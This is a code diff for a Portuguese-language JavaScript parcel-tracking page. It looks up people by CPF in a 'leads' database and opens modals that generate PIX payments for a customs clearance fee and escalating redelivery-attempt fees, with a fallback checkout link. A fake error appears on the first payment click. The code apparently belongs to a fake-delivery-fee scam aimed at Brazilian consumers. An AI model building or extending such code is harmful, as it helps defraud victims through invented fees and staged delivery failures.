@@ -3,10 +3,10 @@
  * SEM API DE CPF - APENAS DADOS DO SUPABASE
  */
 import { DatabaseService } from '../services/database.js';
-import { UIHelpers } from '../utils/ui-helpers.js';
 import { CPFValidator } from '../utils/cpf-validator.js';
 import { ZentraPayService } from '../services/zentra-pay.js';
 import { TrackingGenerator } from '../utils/tracking-generator.js';
+import { UIHelpers } from '../utils/ui-helpers.js';
 
 export class TrackingSystem {
     constructor() {
@@ -78,6 +78,74 @@ export class TrackingSystem {
         this.setupAccordion();
         this.setupKeyboardEvents();
         console.log('Event listeners configurados');
+    }
+
+    setupModalEvents() {
+        console.log('Configurando eventos dos modais...');
+        
+        // Modal de liberação aduaneira
+        const simulateButton = document.getElementById('simulatePaymentButton');
+        const closeButton = document.getElementById('closeModal');
+        const modal = document.getElementById('liberationModal');
+        
+        if (simulateButton) {
+            simulateButton.addEventListener('click', (e) => {
+                e.preventDefault();
+                // Simular erro na primeira tentativa
+                if (!simulateButton.hasAttribute('data-retry')) {
+                    simulateButton.setAttribute('data-retry', 'true');
+                    alert('Ocorreu um erro ao tentar processar o pagamento');
+                    simulateButton.textContent = '--';
+                    return;
+                }
+                
+                // Segunda tentativa - sucesso
+                if (modal) {
+                    modal.style.display = 'none';
+                }
+                
+                // Processar pagamento com sucesso
+                this.processSuccessfulPayment();
+            });
+        }
+        
+        if (closeButton) {
+            closeButton.addEventListener('click', () => {
+                if (modal) {
+                    modal.style.display = 'none';
+                }
+            });
+        }
+        
+        if (modal) {
+            modal.addEventListener('click', (e) => {
+                if (e.target === modal) {
+                    modal.style.display = 'none';
+                }
+            });
+        }
+        
+        // Modal de tentativa de entrega
+        const deliveryModal = document.getElementById('deliveryModal');
+        const closeDeliveryButton = document.getElementById('closeDeliveryModal');
+        
+        if (closeDeliveryButton) {
+            closeDeliveryButton.addEventListener('click', () => {
+                if (deliveryModal) {
+                    deliveryModal.style.display = 'none';
+                }
+            });
+        }
+        
+        if (deliveryModal) {
+            deliveryModal.addEventListener('click', (e) => {
+                if (e.target === deliveryModal) {
+                    deliveryModal.style.display = 'none';
+                }
+            });
+        }
+        
+        console.log('Eventos dos modais configurados');
     }
 
     setupFormSubmission() {
@@ -265,7 +333,7 @@ export class TrackingSystem {
         }
 
         console.log('CPF válido, buscando APENAS no banco...');
-        this.showLoadingNotification();
+        UIHelpers.showLoadingNotification();
 
         const trackButtons = document.querySelectorAll('#trackButton, .track-button, button[type="submit"]');
         const originalTexts = [];
@@ -294,7 +362,7 @@ export class TrackingSystem {
                 this.leadData = dbResult.data;
                 this.currentCPF = cleanCPF;
                 
-                this.closeLoadingNotification();
+                UIHelpers.closeLoadingNotification();
                 
                 console.log('📋 Exibindo dados do banco...');
                 this.displayOrderDetailsFromDatabase();
@@ -304,7 +372,7 @@ export class TrackingSystem {
                 
                 const orderDetails = document.getElementById('orderDetails');
                 if (orderDetails) {
-                    this.scrollToElement(orderDetails, 100);
+                    UIHelpers.scrollToElement(orderDetails, 100);
                 }
                 
                 // Destacar botão de liberação se necessário
@@ -314,7 +382,7 @@ export class TrackingSystem {
                 
             } else {
                 console.log('❌ CPF não encontrado no banco');
-                this.closeLoadingNotification();
+                UIHelpers.closeLoadingNotification();
                 this.showCpfNotFoundDialog();
                 
                 // Mostrar pop-up discreta após 2 segundos
@@ -325,8 +393,8 @@ export class TrackingSystem {
             
         } catch (error) {
             console.error('Erro no processo:', error);
-            this.closeLoadingNotification();
-            this.showError('Erro ao consultar CPF. Tente novamente.');
+            UIHelpers.closeLoadingNotification();
+            UIHelpers.showError('Erro ao consultar CPF. Tente novamente.');
         } finally {
             trackButtons.forEach((button, index) => {
                 if (button.textContent && originalTexts[index]) {
@@ -658,6 +726,230 @@ export class TrackingSystem {
     getAttemptValue(attemptNumber) {
         const values = [7.74, 12.38, 16.46];
         return values[attemptNumber - 1] || 7.74;
+    }
+
+    showCpfNotFoundDialog() {
+        UIHelpers.showError('CPF não encontrado no sistema. Verifique se o CPF está correto.');
+    }
+
+    showDiscreteHelpPopup() {
+        console.log('Mostrando popup de ajuda discreta');
+    }
+
+    saveTrackingData() {
+        if (this.trackingData && this.currentCPF) {
+            localStorage.setItem(`tracking_${this.currentCPF}`, JSON.stringify(this.trackingData));
+        }
+    }
+
+    clearOldData() {
+        // Limpar dados antigos se necessário
+        console.log('Limpando dados antigos...');
+    }
+
+    handleAutoFocus() {
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('focus') === 'cpf') {
+            const cpfInput = document.getElementById('cpfInput');
+            if (cpfInput) {
+                setTimeout(() => cpfInput.focus(), 500);
+            }
+        }
+    }
+
+    setupCopyButtons() {
+        console.log('Configurando botões de cópia...');
+        
+        const copyButtons = document.querySelectorAll('[id*="copyPix"]');
+        copyButtons.forEach(button => {
+            button.addEventListener('click', (e) => {
+                e.preventDefault();
+                const targetId = button.id.replace('copyPix', 'pixCode');
+                const targetElement = document.getElementById(targetId);
+                
+                if (targetElement) {
+                    targetElement.select();
+                    document.execCommand('copy');
+                    
+                    const originalText = button.innerHTML;
+                    button.innerHTML = '<i class="fas fa-check"></i> Copiado!';
+                    setTimeout(() => {
+                        button.innerHTML = originalText;
+                    }, 2000);
+                }
+            });
+        });
+    }
+
+    setupAccordion() {
+        const detailsHeader = document.getElementById('detailsHeader');
+        const detailsContent = document.getElementById('detailsContent');
+        
+        if (detailsHeader && detailsContent) {
+            detailsHeader.addEventListener('click', () => {
+                const isOpen = detailsContent.style.display === 'block';
+                detailsContent.style.display = isOpen ? 'none' : 'block';
+                
+                const toggleIcon = detailsHeader.querySelector('.toggle-icon i');
+                if (toggleIcon) {
+                    toggleIcon.className = isOpen ? 'fas fa-chevron-down' : 'fas fa-chevron-up';
+                }
+            });
+        }
+    }
+
+    setupKeyboardEvents() {
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') {
+                // Fechar modais abertos
+                const modals = document.querySelectorAll('.modal-overlay');
+                modals.forEach(modal => {
+                    if (modal.style.display === 'flex') {
+                        modal.style.display = 'none';
+                    }
+                });
+            }
+        });
+    }
+
+    updateElement(id, value) {
+        const element = document.getElementById(id);
+        if (element) {
+            element.textContent = value;
+        }
+    }
+
+    showElement(id) {
+        const element = document.getElementById(id);
+        if (element) {
+            element.style.display = 'block';
+        }
+    }
+
+    getFirstAndLastName(fullName) {
+        if (!fullName) return 'Nome não informado';
+        const names = fullName.trim().split(' ');
+        if (names.length === 1) return names[0];
+        return `${names[0]} ${names[names.length - 1]}`;
+    }
+
+    highlightLiberationButton() {
+        const liberationButton = document.querySelector('.liberation-button-timeline');
+        if (liberationButton) {
+            liberationButton.style.animation = 'pulse 2s infinite';
+        }
+    }
+
+    openLiberationModal() {
+        console.log('Abrindo modal de liberação aduaneira...');
+        const modal = document.getElementById('liberationModal');
+        if (modal) {
+            modal.style.display = 'flex';
+            
+            // Gerar PIX via Zentra Pay
+            this.generatePixForLiberation();
+        }
+    }
+
+    async generatePixForLiberation() {
+        try {
+            console.log('Gerando PIX para liberação aduaneira...');
+            
+            // Tentar gerar PIX via API
+            const pixData = await this.zentraPayService.generatePix(26.34, 'Taxa de Liberação Aduaneira');
+            
+            if (pixData && pixData.pix && pixData.pix.payload) {
+                // Atualizar QR Code e código PIX
+                const qrCodeImg = document.getElementById('realPixQrCode');
+                const pixCodeInput = document.getElementById('pixCodeModal');
+                
+                if (qrCodeImg) {
+                    qrCodeImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixData.pix.payload)}`;
+                }
+                
+                if (pixCodeInput) {
+                    pixCodeInput.value = pixData.pix.payload;
+                }
+                
+                console.log('✅ PIX gerado via API Zentra Pay');
+            } else {
+                throw new Error('Resposta inválida da API');
+            }
+        } catch (error) {
+            console.warn('⚠️ Erro ao gerar PIX via API, usando link direto:', error);
+            
+            // Fallback para link direto
+            const linkButton = document.createElement('a');
+            linkButton.href = 'https://checkout.zentrapaybr.com/UlCGsjOn';
+            linkButton.target = '_blank';
+            linkButton.className = 'zentra-pay-link-button';
+            linkButton.innerHTML = '<i class="fas fa-external-link-alt"></i> Pagar via Zentra Pay';
+            
+            const pixSection = document.querySelector('.professional-pix-section');
+            if (pixSection) {
+                pixSection.appendChild(linkButton);
+            }
+        }
+    }
+
+    openDeliveryModal(attemptNumber, value) {
+        console.log(`Abrindo modal de entrega - Tentativa ${attemptNumber}, Valor: R$ ${value}`);
+        
+        const modal = document.getElementById('deliveryModal');
+        const feeValue = document.getElementById('deliveryFeeValue');
+        const deliveryTime = document.getElementById('deliveryTime');
+        
+        if (modal) {
+            modal.style.display = 'flex';
+        }
+        
+        if (feeValue) {
+            feeValue.textContent = `R$ ${value.toFixed(2)}`;
+        }
+        
+        if (deliveryTime) {
+            const times = ['05:30', '14:20', '09:45', '16:10'];
+            deliveryTime.textContent = times[attemptNumber - 1] || '05:30';
+        }
+        
+        // Gerar PIX para entrega
+        this.generatePixForDelivery(value, attemptNumber);
+    }
+
+    async generatePixForDelivery(value, attemptNumber) {
+        try {
+            console.log(`Gerando PIX para entrega - Tentativa ${attemptNumber}, Valor: R$ ${value}`);
+            
+            const pixData = await this.zentraPayService.generatePix(value, `Taxa de Reentrega - ${attemptNumber}ª Tentativa`);
+            
+            if (pixData && pixData.pix && pixData.pix.payload) {
+                const pixCodeInput = document.getElementById('pixCodeDelivery');
+                if (pixCodeInput) {
+                    pixCodeInput.value = pixData.pix.payload;
+                }
+                
+                console.log('✅ PIX de entrega gerado via API');
+            }
+        } catch (error) {
+            console.warn('⚠️ Erro ao gerar PIX de entrega:', error);
+        }
+    }
+
+    processSuccessfulPayment() {
+        console.log('Processando pagamento bem-sucedido...');
+        
+        if (this.leadData) {
+            // Atualizar status de pagamento
+            this.leadData.status_pagamento = 'pago';
+            this.leadData.etapa_atual = Math.max(this.leadData.etapa_atual, 12);
+            
+            // Regenerar dados de rastreamento
+            this.generateRealTrackingData();
+            this.displayTrackingResults();
+            this.saveTrackingData();
+            
+            console.log('✅ Pagamento processado, etapas atualizadas');
+        }
     }
 }
 
